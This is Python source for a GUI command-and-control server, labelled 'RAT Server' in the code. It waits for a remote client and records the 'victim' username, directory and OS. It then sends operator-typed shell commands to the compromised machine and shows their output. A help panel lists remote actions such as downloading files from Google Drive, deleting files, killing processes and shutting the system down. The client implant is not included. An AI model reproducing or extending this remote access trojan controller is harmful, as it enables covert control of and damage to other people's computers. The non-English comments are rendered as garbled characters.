import customtkinter as ctk
import threading
import socket
from virtual_keyboard import NormalKeyboard
import subprocess
import platform

active_client = [None]  # –ò—Å–ø–æ–ª—å–∑—É–µ–º —Å–ø–∏—Å–æ–∫ –∫–∞–∫ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä
port = 12345
active_user = ["Unknown"]  # –î–æ–±–∞–≤–∏–ª–∏ –∏–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
current_OS = "Unknown" 

list_of_command = {
        "Windows": [
            "gdown <URL> <output_path> - —Å–∫–∞—á–∏–≤–∞–µ—Ç —Ñ–∞–π–ª —Å Google Drive",
            "dir - –ø–æ–∫–∞–∑—É—î –≤–º—ñ—Å—Ç –ø–æ—Ç–æ—á–Ω–æ—ó –¥–∏—Ä–µ–∫—Ç–æ—Ä—ñ—ó",
            "cd <—à–ª—è—Ö> - –∑–º—ñ–Ω—é—î –ø–æ—Ç–æ—á–Ω—É –¥–∏—Ä–µ–∫—Ç–æ—Ä—ñ—é",
            "ipconfig - –º–µ—Ä–µ–∂–µ–≤—ñ —ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∏",
            "cls - –æ—á–∏—â–µ–Ω–Ω—è –µ–∫—Ä–∞–Ω—É",
            "ping <–∞–¥—Ä–µ—Å–∞> - –ø–µ—Ä–µ–≤—ñ—Ä–∫–∞ –¥–æ—Å—Ç—É–ø–Ω–æ—Å—Ç—ñ",
            "mkdir <–ø–∞–ø–∫–∞> - –Ω–æ–≤–∞ –¥–∏—Ä–µ–∫—Ç–æ—Ä—ñ—è",
            "exit - –∑–∞–≤–µ—Ä—à—É—î —Ä–æ–±–æ—Ç—É",
            "copy <—Ñ–∞–π–ª1> <—Ñ–∞–π–ª2> - –∫–æ–ø—ñ—é—î —Ñ–∞–π–ª",
            "del <—Ñ–∞–π–ª> - –≤–∏–¥–∞–ª—è—î —Ñ–∞–π–ª",
            "move <—Ñ–∞–π–ª> <–ø–∞–ø–∫–∞> - –ø–µ—Ä–µ–º—ñ—â—É—î —Ñ–∞–π–ª",
            "tasklist - —Å–ø–∏—Å–æ–∫ –∑–∞–ø—É—â–µ–Ω–∏—Ö –ø—Ä–æ—Ü–µ—Å—ñ–≤",
            "taskkill /IM <—ñ–º'—è –ø—Ä–æ—Ü–µ—Å—É> - –∑–∞–≤–µ—Ä—à–∏—Ç–∏ –ø—Ä–æ—Ü–µ—Å—Å",
            "chkdsk - –ø—Ä–æ–≤–µ—Ä–∫–∞ –¥–∏—Å–∫–∞",
            "shutdown /s - –≤–∏–º–∫–Ω–µ–Ω–Ω—è –∫–æ–º–ø'—é—Ç–µ—Ä–∞",
            "systeminfo - –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –ø—Ä–æ —Å–∏—Å—Ç–µ–º—É",
        ],
        "Linux": [
            "gdown <URL> <output_path> - —Å–∫–∞—á–∏–≤–∞–µ—Ç —Ñ–∞–π–ª —Å Google Drive",
            "ls - –ø–µ—Ä–µ–≥–ª—è–¥ –≤–º—ñ—Å—Ç—É –∫–∞—Ç–∞–ª–æ–≥—É",
            "cd <—à–ª—è—Ö> - –∑–º—ñ–Ω–∞ –∫–∞—Ç–∞–ª–æ–≥—É",
            "rm <—Ñ–∞–π–ª> - –≤–∏–¥–∞–ª–µ–Ω–Ω—è —Ñ–∞–π–ª—ñ–≤",
            "clear - –æ—á–∏—â–µ–Ω–Ω—è –µ–∫—Ä–∞–Ω—É",
            "mkdir <–∫–∞—Ç–∞–ª–æ–≥> - —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –∫–∞—Ç–∞–ª–æ–≥—É",
            "exit - –∑–∞–≤–µ—Ä—à—É—î —Ä–æ–±–æ—Ç—É",
            "cp <—Ñ–∞–π–ª1> <—Ñ–∞–π–ª2> - –∫–æ–ø—ñ—é—î —Ñ–∞–π–ª",
            "mv <—Ñ–∞–π–ª> <–∫–∞—Ç–∞–ª–æ–≥> - –ø–µ—Ä–µ–º—ñ—â—É—î —Ñ–∞–π–ª",
            "touch <—Ñ–∞–π–ª> - —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –Ω–æ–≤–æ–≥–æ —Ñ–∞–π–ª—É",
            "chmod <–ø—Ä–∞–≤–∞> <—Ñ–∞–π–ª> - –∑–º—ñ–Ω–∞ –ø—Ä–∞–≤ –¥–æ—Å—Ç—É–ø—É",
            "ps - —Å–ø–∏—Å–æ–∫ –∑–∞–ø—É—â–µ–Ω–∏—Ö –ø—Ä–æ—Ü–µ—Å—ñ–≤",
            "kill <PID> - –∑–∞–≤–µ—Ä—à–∏—Ç–∏ –ø—Ä–æ—Ü–µ—Å",
            "shutdown - –≤–∏–º–∫–Ω–µ–Ω–Ω—è —Å–∏—Å—Ç–µ–º–∏",
            "ifconfig - –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è –º–µ—Ä–µ–∂–µ–≤–∏—Ö —ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å–æ–≤",
        ]
}

def safe_textbox_insert(textbox, text):
    textbox.configure(state="normal")
    textbox.insert("end", text)
    textbox.yview("end")
    textbox.configure(state="disabled")

def clear_frame(frame):
    for widget in frame.winfo_children():
        widget.destroy()

def get_user_name(client_socket):
    user_name = ""
    while True:
        data = client_socket.recv(10000).decode(encoding="utf-8", errors="replace")
        user_name += data
        if "END_OF_USER_MSG" in user_name:
            user_name = user_name.replace("END_OF_USER_MSG", "").strip()
            break
    return user_name

def get_current_directory(client_socket):
    current_dir = ""
    while True:
        data = client_socket.recv(10000).decode(encoding="utf-8", errors="replace")
        current_dir += data
        if "END_OF_DIR_MSG" in current_dir:
            current_dir = current_dir.replace("END_OF_DIR_MSG", "").strip()
            break
    return current_dir


def read_all_info(client_socket):
    data = ""
    while True:
        chunk = client_socket.recv(10000).decode("utf-8", errors="replace")
        if not chunk:
            break
        data += chunk
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º, —á—Ç–æ –≤ –¥–∞–Ω–Ω—ã—Ö –µ—Å—Ç—å –≤—Å–µ —Ç—Ä–∏ –º–∞—Ä–∫–µ—Ä–∞
        if ("END_OF_USER_MSG" in data and
            "END_OF_DIR_MSG" in data and
            "END_OF_OS_MSG" in data):
            break
    return data

    # –î–∞–ª–µ–µ –º–æ–∂–µ—à—å –ø—Ä–æ–¥–æ–ª–∂–∏—Ç—å –æ–±—Ä–∞–±–∞—Ç—ã–≤–∞—Ç—å –∫–æ–º–∞–Ω–¥—ã –∏–∑ remaining –∏–ª–∏ —á–∏—Ç–∞—Ç—å –∏–∑ —Å–æ–∫–µ—Ç–∞, –∫–∞–∫ —É —Ç–µ–±—è –¥–∞–ª—å—à–µ –≤ –∫–æ–¥–µ...


def is_message_end(data):
    return (
        data.endswith("END_OF_USER_MSG") or 
        data.endswith("END_OF_DIR_MSG") or 
        data.endswith("END_OF_MSG") or
        data.endswith("END_OF_OS_MSG")
    )


def is_command(data):
    return not is_message_end(data)

def execute_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        output = result.stdout if result.stdout else result.stderr
        return output
    except Exception as e:
        return f"‚ùå –û—à–∏–±–∫–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∫–æ–º–∞–Ω–¥—ã: {e}"

def receive_full_response(client_socket):
    buffer = ""
    client_socket.settimeout(2)  # –ù–∞–ø—Ä–∏–º–µ—Ä, 2 —Å–µ–∫—É–Ω–¥—ã –æ–∂–∏–¥–∞–Ω–∏—è –Ω–æ–≤—ã—Ö –¥–∞–Ω–Ω—ã—Ö
    try:
        while True:
            data = client_socket.recv(10000).decode("utf-8", errors="replace")
            if not data:
                break  # –°–æ–µ–¥–∏–Ω–µ–Ω–∏–µ –∑–∞–∫—Ä—ã—Ç–æ –∏–ª–∏ –Ω–µ—Ç –¥–∞–Ω–Ω—ã—Ö
            buffer += data
            if any(marker in buffer for marker in ["END_OF_USER_MSG", "END_OF_DIR_MSG", "END_OF_MSG", "END_OF_OS_MSG"]):
                break  # –ü–æ–ª—É—á–∏–ª–∏ –ø–æ–ª–Ω—ã–π –æ—Ç–≤–µ—Ç
    except socket.timeout:
        # –¢–∞–π–º–∞—É—Ç, —Å—á–∏—Ç–∞–µ–º —á—Ç–æ –¥–∞–Ω–Ω—ã–µ –±–æ–ª—å—à–µ –Ω–µ –±—É–¥—É—Ç
        pass
    finally:
        client_socket.settimeout(None)  # –°–±—Ä–æ—Å —Ç–∞–π–º–∞—É—Ç–∞ –≤ None (–±–ª–æ–∫–∏—Ä—É—é—â–∏–π —Ä–µ–∂–∏–º)
    return buffer


def send_command_to_client(command_line, client_socket, text_box):
    """–û—Ç–ø—Ä–∞–≤–∫–∞ –∫–æ–º–∞–Ω–¥—ã –Ω–∞ –∫–ª–∏–µ–Ω—Ç –∏–ª–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –ª–æ–∫–∞–ª—å–Ω–æ, –µ—Å–ª–∏ –Ω–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–æ"""
    command = command_line.get()
    if not command:
        return
    
    if command in ("cls", "clear"):
        text_box.configure(state="normal")
        text_box.delete("1.0", "end")
        text_box.configure(state="disabled")
        command_line.delete(0, "end")
        return

    if client_socket:
        # –ö–ª–∏–µ–Ω—Ç –ø–æ–¥–∫–ª—é—á—ë–Ω ‚Äî –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º –∫–æ–º–∞–Ω–¥—É
        safe_textbox_insert(text_box, f"üì§ –û—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ –∫–æ–º–∞–Ω–¥–∞: {command}\n")
        text_box.yview("end")
        try:
            client_socket.send(command.encode(encoding="utf-8", errors="replace"))
            response = receive_full_response(client_socket)
            if any(marker in response for marker in ["END_OF_USER_MSG", "END_OF_DIR_MSG", "END_OF_MSG", "END_OF_OS_MSG"]):
                safe_textbox_insert(text_box, f"üì• –û—Ç–≤–µ—Ç –æ—Ç –∫–ª–∏–µ–Ω—Ç–∞: {response}\n")
                safe_textbox_insert(text_box, "="*24+"End Text"+"="*24+"\n")
            else:
                safe_textbox_insert(text_box, f"üì• –û—Ç–≤–µ—Ç –æ—Ç –∫–ª–∏–µ–Ω—Ç–∞: {response}\n")

        except Exception as e:
            safe_textbox_insert(text_box, f"‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏: {e}\n")
    else:
        # –ö–ª–∏–µ–Ω—Ç –Ω–µ –ø–æ–¥–∫–ª—é—á—ë–Ω ‚Äî –≤—ã–ø–æ–ª–Ω—è–µ–º –ª–æ–∫–∞–ª—å–Ω–æ
        safe_textbox_insert(text_box, f"‚öô –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –ª–æ–∫–∞–ª—å–Ω–æ: {command}\n")
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            output = result.stdout if result.stdout else result.stderr
            safe_textbox_insert(text_box, f"üì• –õ–æ–∫–∞–ª—å–Ω—ã–π –≤—ã–≤–æ–¥:\n{output}\n")
        except Exception as e:
            safe_textbox_insert(text_box, f"‚ùå –û—à–∏–±–∫–∞ –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è: {e}\n")
    command_line.delete(0, "end")
    text_box.yview("end")

def server(parent_frame, go_back_callback=None):
    clear_frame(parent_frame)

    def handle_client(client_socket, text_box, username_label, dir_label, os_label):
        global current_OS

        full_data = read_all_info(client_socket)

        # –£–¥–∞–ª—è–µ–º –∏–ª–∏ –∑–∞–º–µ–Ω—è–µ–º –≤—Å–µ END_OF_MSG, –µ—Å–ª–∏ –≤–¥—Ä—É–≥ –µ—Å—Ç—å –≤ –Ω–∞—á–∞–ª—å–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö
        full_data = full_data.replace("END_OF_MSG", " ")

        # –ü–∞—Ä—Å–∏–º –∏–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
        user_name = full_data.split("END_OF_USER_MSG")[0].strip()

        # –ü–∞—Ä—Å–∏–º –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é
        current_dir = full_data.split("END_OF_USER_MSG")[1].split("END_OF_DIR_MSG")[0].strip()

        # –ü–∞—Ä—Å–∏–º –û–°
        current_OS = full_data.split("END_OF_DIR_MSG")[1].split("END_OF_OS_MSG")[0].strip()

        # –û—Å—Ç–∞—Ç–æ–∫, –µ—Å–ª–∏ –Ω—É–∂–Ω–æ
        remaining = full_data.split("END_OF_OS_MSG")[1].strip() if "END_OF_OS_MSG" in full_data else ""

        # –û–±–Ω–æ–≤–ª—è–µ–º UI
        username_label.configure(text=f"Username victim: {user_name}")
        dir_label.configure(text=f"Current dir: {current_dir}")
        os_label.configure(text=f"OS: {current_OS}")

        # After you've set current_OS in handle_client, add:
        if current_OS in list_of_command:
            # –û—á–∏—Å—Ç–∏—Ç—å –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä –∫–æ–º–∞–Ω–¥
            for widget in commands_container.winfo_children():
                widget.destroy()

            # –î–æ–±–∞–≤–∏—Ç—å –∫–æ–º–∞–Ω–¥—ã –≤ commands_container —Å place
            y_position = 10  # –Ω–∞—á–∞–ª—å–Ω–∞—è –∫–æ–æ—Ä–¥–∏–Ω–∞—Ç–∞ Y
            for cmd in list_of_command[current_OS]:
                command_label = ctk.CTkLabel(commands_container, text=cmd, width=660, wraplength=650)
                command_label.pack(pady=3)

        safe_textbox_insert(text_box, f"üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: {user_name}\n")
        safe_textbox_insert(text_box, f"üìÅ –î–∏—Ä–µ–∫—Ç–æ—Ä–∏—è: {current_dir}\n")
        safe_textbox_insert(text_box, f"üñ•Ô∏è –û–°: {current_OS}\n")

    def start_server_thread(server_socket, text_box, status_label, username_label, dir_label, os_label):
        while True:
            try:
                client_socket, client_address = server_socket.accept()
                active_client[0] = client_socket
                status_label.configure(text="üü¢ Connected", text_color="green")
                print(f"–ö–ª–∏–µ–Ω—Ç –ø–æ–¥–∫–ª—é—á–µ–Ω: {client_address}")
                text_box.insert("end", "Client is connected")
                client_thread = threading.Thread(target=handle_client, args=(client_socket, text_box, username_label, dir_label, os_label))
                client_thread.daemon = True
                client_thread.start()
            except Exception as e:
                print(f"–û—à–∏–±–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è: {e}")
                safe_textbox_insert(text_box, f"‚ùå –û—à–∏–±–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è: {e}\n")
                status_label.configure(text="üî¥ Error", text_color="red")
                break

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # –ß—Ç–æ–±—ã –∏–∑–±–µ–∂–∞—Ç—å WinError 10048
    try:
        server_socket.bind(('0.0.0.0', port))
        server_socket.listen(1)
    except OSError as e:
        print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø—Ä–∏–≤—è–∑–∫–µ —Å–æ–∫–µ—Ç–∞: {e}")
        return  # –ú–æ–∂–Ω–æ –≤—ã–≤–µ—Å—Ç–∏ —ç—Ç–æ –≤ UI

    # –û—Å–Ω–æ–≤–Ω–æ–π –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä —Å –≥–æ—Ä–∏–∑–æ–Ω—Ç–∞–ª—å–Ω—ã–º —Ä–∞–∑–¥–µ–ª–µ–Ω–∏–µ–º (–ª–µ–≤–∞—è –∏ –ø—Ä–∞–≤–∞—è —á–∞—Å—Ç–∏)
    main_frame = ctk.CTkFrame(parent_frame, fg_color="#0f0f0f")
    main_frame.pack(fill="both", expand=True)

    # –õ–µ–≤–∞—è —á–∞—Å—Ç—å (–ø–∞–Ω–µ–ª—å –∫–Ω–æ–ø–æ–∫)
    left_frame = ctk.CTkFrame(main_frame, width=200)
    left_frame.pack(side="left", fill="y", padx=10, pady=10)

    # –ü—Ä–∞–≤–∞—è —á–∞—Å—Ç—å (—Å–æ—Å—Ç–æ–∏—Ç –∏–∑ –≤–µ—Ä—Ö–Ω–µ–π –∏ –Ω–∏–∂–Ω–µ–π)
    right_frame = ctk.CTkFrame(main_frame)
    right_frame.pack(side="left", fill="both", expand=True, padx=10, pady=10)

    # –í–µ—Ä—Ö–Ω—è—è —á–∞—Å—Ç—å –ø—Ä–∞–≤–æ–π –ø–∞–Ω–µ–ª–∏ (—Ç–µ–∫—Å—Ç–±–æ–∫—Å –∏ –ø–æ–ª–µ –≤–≤–æ–¥–∞)
    top_right_frame = ctk.CTkFrame(right_frame)
    top_right_frame.pack(side="top", fill="both", expand=True)

    bottom_frame = ctk.CTkFrame(main_frame)
    # bottom_frame.pack(fill="x", pady=10)

    menu_frame = ctk.CTkFrame(main_frame, width=700, fg_color="#08080A", corner_radius=10)

    commands_container = ctk.CTkScrollableFrame(menu_frame, width=650, height=200)
    commands_container.place(x=10, y=130)  # –ü–æ–¥ –∑–∞–≥–æ–ª–æ–≤–∫–∞–º–∏, —Å –Ω–µ–±–æ–ª—å—à–∏–º –æ—Ç—Å—Ç—É–ø–æ–º

    close_menu = ctk.CTkButton(menu_frame, text="X", width=50, height=50, command=lambda: animate_sidebar_close(menu_frame))
    close_menu.place(relx=0.99, rely=0.05, anchor="ne")

    close_keyboard_button = ctk.CTkButton(
        bottom_frame,
        text="X",
        font=("Arial", 25),
        command=lambda: hide_keyboard(),
        fg_color="#3b3b3b",
        border_color="#8d33ff",
        hover_color="#444444",
        width=50,
        height=50,
        border_width=2
    )
    close_keyboard_button.place(relx=1.0, rely=0.0, anchor="ne", x=-10, y=10)

    # === –õ–µ–≤–∞—è –ø–∞–Ω–µ–ª—å ===
    title = ctk.CTkLabel(left_frame, text="RAT Server üíÄ", font=ctk.CTkFont(family="Consolas", size=18, weight="bold"), text_color="#8a2be2")
    title.pack(pady=5)

    # === –ü—Ä–∞–≤–∞—è –≤–µ—Ä—Ö–Ω—è—è –ø–∞–Ω–µ–ª—å ===
    command_line = ctk.CTkEntry(top_right_frame, placeholder_text="Enter command...", fg_color="#111111", text_color="#39ff14", placeholder_text_color="#444444")
    command_line.pack(fill="x", padx=5, pady=5)

    send_button = ctk.CTkButton(
        top_right_frame,
        text="üì§ –û—Ç–ø—Ä–∞–≤–∏—Ç—å",
        command=lambda: send_command_to_client(command_line, active_client[0], text_box), 
        fg_color="#1a1a1a", 
        hover_color="#8a2be2", 
        text_color="#ff0033"
    )
    send_button.pack(padx=5, pady=5)

    text_box = ctk.CTkTextbox(top_right_frame, fg_color="#0f0f0f", text_color="#39ff14")
    text_box.pack(fill="both", expand=True, padx=5, pady=5)

    # === –ö–Ω–æ–ø–∫–∞ –¥–ª—è —Å—Ç–∞—Ä—Ç–∞ —Å–µ—Ä–≤–µ—Ä–∞ ===
    def run_server():
        thread = threading.Thread(target=start_server_thread, args=(server_socket, text_box, status_label, username_label, dir_label, os_label))
        thread.daemon = True
        thread.start()

    username_label = ctk.CTkLabel(menu_frame, text="Username victim: Unknown", width=300)
    username_label.place(x=10, y=10)

    dir_label = ctk.CTkLabel(menu_frame, text="Current dir: Unknown", width=300)
    dir_label.place(x=10, y=50)

    os_label = ctk.CTkLabel(menu_frame, text="OS: Unknown", width=300)
    os_label.place(x=10, y=90)

    start_server_btn = ctk.CTkButton(left_frame, text="üöÄ Start Server", command=lambda: run_server())
    start_server_btn.pack(pady=10)

    back_btn = ctk.CTkButton(left_frame, text="‚Üê Back", command=go_back_callback)
    back_btn.pack(pady=10)

    Info = ctk.CTkLabel(left_frame, text="‚ÑπÔ∏è Info:", text_color="#040177")
    Info.pack(pady=10)

    # –ò–Ω–¥–∏–∫–∞—Ç–æ—Ä –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è
    status_label = ctk.CTkLabel(left_frame, text="üî¥ Not connected", text_color="red")
    status_label.pack(pady=5)

    # === –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –≤ text_box ===
    safe_textbox_insert(text_box, f"listen on the port: {port}...\n")
    text_box.configure(state="disabled")
    text_box.pack(pady=10, fill="both", expand=True, padx=20)

    auto_thread = None  # –û–±—ä—è–≤–∏–º –ø–µ—Ä–µ–º–µ–Ω–Ω—É—é, –Ω–æ –Ω–µ –∑–∞–ø—É—Å–∫–∞–µ–º –ø–æ—Ç–æ–∫
    
    # –ü–µ—Ä–µ–º–µ–Ω–Ω–∞—è –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è –∞–∫—Ç–∏–≤–Ω–æ–≥–æ –ø–æ–ª—è
    active_entry = None
    def set_target_entry(entry, name):
        nonlocal active_entry
        active_entry = entry
        keyboard.target_entry = entry
        #print(f"[DEBUG] –ê–∫—Ç–∏–≤–Ω–æ–µ –ø–æ–ª–µ –≤–≤–æ–¥–∞: {name}")

    # –í–∏—Ä—Ç—É–∞–ª—å–Ω–∞—è –∫–ª–∞–≤–∏–∞—Ç—É—Ä–∞ –≤ –Ω–∏–∂–Ω–µ–º —Ñ—Ä–µ–π–º–µ
    keyboard = None  # –ö–ª–∞–≤–∏–∞—Ç—É—Ä–∞ –±—É–¥–µ—Ç —Å–æ–∑–¥–∞–Ω–∞ –ø–æ–∑–∂–µ


    # –ü—Ä–∏–≤—è–∑–∫–∞ –∫–ª–∞–≤–∏–∞—Ç—É—Ä—ã –∫ –ø–æ–ª—è–º –≤–≤–æ–¥–∞
    command_line.bind("<FocusIn>", lambda e: [set_target_entry(command_line, "Target (IP/Domain)"), show_keyboard()])

    keyboard_visible = False

    def slide_keyboard(target_y, step=10):
        parent_frame.update()
        parent_frame_width = parent_frame.winfo_width()
        x_pos = (parent_frame_width - keyboard_width) // 2

        current_y = bottom_frame.winfo_y()
        if abs(current_y - target_y) < step:
            bottom_frame.place_configure(x=x_pos, y=target_y, width=keyboard_width, height=keyboard_height)
            return
        direction = 1 if target_y > current_y else -1
        next_y = current_y + direction * step
        bottom_frame.place_configure(x=x_pos, y=next_y, width=keyboard_width, height=keyboard_height)
        parent_frame.after(10, lambda: slide_keyboard(target_y, step))


    def show_keyboard():
        nonlocal keyboard_visible, keyboard
        if keyboard_visible:
            return

        if keyboard is None:
            keyboard = NormalKeyboard(bottom_frame, command_line)
            # –ü—Ä–∏–≤—è–∑–∫–∞ —Ç–æ–ª—å–∫–æ –ø—Ä–∏ –ø–µ—Ä–≤–æ–º —Å–æ–∑–¥–∞–Ω–∏–∏:
            command_line.bind("<FocusIn>", lambda e: [set_target_entry(command_line, "Target (IP/Domain)"), show_keyboard()])

        keyboard_visible = True
        slide_keyboard(target_y=parent_frame.winfo_height() - 300)


    def hide_keyboard():
        nonlocal keyboard_visible
        if not keyboard_visible:
            return
        keyboard_visible = False
        slide_keyboard(target_y=parent_frame.winfo_height())

    def toggle_keyboard():
        if keyboard_visible:
            hide_keyboard()
        else:
            show_keyboard()

    toggle_button = ctk.CTkButton(
        left_frame,
        text="‚å® –ö–ª–∞–≤–∏–∞—Ç—É—Ä–∞",
        command=lambda: toggle_keyboard(),
        fg_color="#3b3b3b",
        border_color="#8d33ff",
        hover_color="#444444",
        border_width=2
    )
    toggle_button.pack(side="left", padx=10)


    # –ò–∑–Ω–∞—á–∞–ª—å–Ω–æ –∫–ª–∞–≤–∏–∞—Ç—É—Ä–∞ —Å–∫—Ä—ã—Ç–∞ (—Å–¥–≤–∏–≥–∞–µ–º –∑–∞ –ø—Ä–µ–¥–µ–ª—ã –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞)
    keyboard_width = 750
    keyboard_height = 300

    def place_keyboard_at(y_pos):
        parent_frame.update()
        parent_frame_width = parent_frame.winfo_width()
        x_pos = (parent_frame_width - keyboard_width) // 2
        bottom_frame.place(in_=parent_frame, x=x_pos, y=y_pos, width=keyboard_width, height=keyboard_height)

    # –ò–∑–Ω–∞—á–∞–ª—å–Ω–æ —Å–∫—Ä—ã–≤–∞–µ–º –∫–ª–∞–≤–∏–∞—Ç—É—Ä—É
    parent_frame.after(100, lambda: place_keyboard_at(parent_frame.winfo_height()))

    is_animation = False
    sidebar_visible = False  # –§–ª–∞–≥

    # –§—É–Ω–∫—Ü–∏—è –¥–ª—è –∞–Ω–∏–º–∞—Ü–∏–∏ –ø–∞–Ω–µ–ª–∏ (–ø–ª–∞–≤–Ω–æ–µ –ø–æ—è–≤–ª–µ–Ω–∏–µ)
    def toggle_sidebar():
        nonlocal sidebar_visible
        if sidebar_visible:
            animate_sidebar_close(menu_frame)
            # sidebar_visible = False  <- —É–±–∏—Ä–∞–µ–º –æ—Ç—Å—é–¥–∞
        else:
            parent_frame.update_idletasks()
            start_x = parent_frame.winfo_width()
            target_x = start_x - 900
            menu_frame.place(x=start_x, y=0, relheight=1.0)
            animate_sidebar_open(menu_frame, target_x)
            sidebar_visible = True

    # –ê–Ω–∏–º–∞—Ü–∏—è –ø–æ—è–≤–ª–µ–Ω–∏—è
    def animate_sidebar_open(frame, target_x, step=20):
        current_x = parent_frame.winfo_width()
        def slide():
            nonlocal current_x
            if current_x > target_x:
                current_x -= step
                frame.place(x=current_x, y=0, relheight=1.0)
                parent_frame.after(10, slide)
            else:
                frame.place(x=target_x, y=0, relheight=1.0)
        slide()


    def animate_sidebar_close(frame, step=20):
        current_x = frame.winfo_x()
        target_x = parent_frame.winfo_width()

        def slide():
            nonlocal current_x
            if current_x < target_x:
                current_x += step
                frame.place(x=current_x, y=0, relheight=1.0)
                parent_frame.after(10, slide)
            else:
                frame.place_forget()
                nonlocal sidebar_visible
                sidebar_visible = False  # –ú–µ–Ω—è–µ–º —Ñ–ª–∞–≥ –∑–¥–µ—Å—å, –ø–æ—Å–ª–µ –∞–Ω–∏–º–∞—Ü–∏–∏ –∑–∞–∫—Ä—ã—Ç–∏—è
        slide()

    hamburger_btn = ctk.CTkButton(
        top_right_frame,
        text="‚ò∞",  # –°–∏–º–≤–æ–ª –≥–∞–º–±—É—Ä–≥–µ—Ä–∞
        command=toggle_sidebar,
        width=40,
        height=40
    )
    hamburger_btn.place(relx=0.99, rely=0.1, anchor="ne")

    # if current_OS in list_of_command:
    #     # –û—á–∏—Å—Ç–∏—Ç—å –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä –∫–æ–º–∞–Ω–¥
    #     for widget in commands_container.winfo_children():
    #         widget.destroy()

    #     # –î–æ–±–∞–≤–∏—Ç—å –∫–æ–º–∞–Ω–¥—ã –≤ commands_container —Å place
    #     y_position = 10  # –Ω–∞—á–∞–ª—å–Ω–∞—è –∫–æ–æ—Ä–¥–∏–Ω–∞—Ç–∞ Y
    #     for cmd in list_of_command[current_OS]:
    #         command_label = ctk.CTkLabel(commands_container, text=cmd)
    #         command_label.place(x=10, y=y_position)
    #         y_position += command_label.winfo_reqheight() + 5  # —Å–º–µ—â–µ–Ω–∏–µ –ø–æ Y –¥–ª—è —Å–ª–µ–¥—É—é—â–µ–π –º–µ—Ç–∫–∏
